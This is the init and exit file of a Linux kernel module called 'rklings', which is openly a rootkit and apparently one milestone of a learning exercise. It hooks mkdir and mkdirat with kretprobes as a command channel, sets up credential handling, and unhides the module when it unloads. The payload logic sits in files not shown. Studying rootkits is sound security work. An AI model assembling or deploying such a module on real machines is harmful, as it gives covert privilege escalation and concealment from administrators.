// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/printk.h>

static int cmd_ping(const char *arg)
{
	pr_info("rklings: pong\n");
	return 0;
}

static int cmd_status(const char *arg)
{
	pr_info("rklings: alive\n");
	return 0;
}

static const struct rk_cmd_entry init_cmds[] = {
	{ "ping",   cmd_ping },
	{ "status", cmd_status },
};

static int __init rk_init(void)
{
	int ret;

	ret = rk_cmds_register(init_cmds, ARRAY_SIZE(init_cmds));
	if (ret)
		return ret;

	ret = rk_cred_init();
	if (ret)
		return ret;

	ret = rk_module_cmds_init();
	if (ret)
		return ret;

	ret = register_kretprobe(&rk_mkdir_probe);
	if (ret)
		return ret;

	ret = register_kretprobe(&rk_mkdirat_probe);
	if (ret)
		goto fail_mkdirat;

	pr_info("rklings: loaded\n");
	return 0;

fail_mkdirat:
	unregister_kretprobe(&rk_mkdir_probe);
	return ret;
}

static void __exit rk_exit(void)
{
	rk_module_unhide();
	unregister_kretprobe(&rk_mkdirat_probe);
	unregister_kretprobe(&rk_mkdir_probe);
	pr_info("rklings: unloaded\n");
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings persistence and stealth milestone");
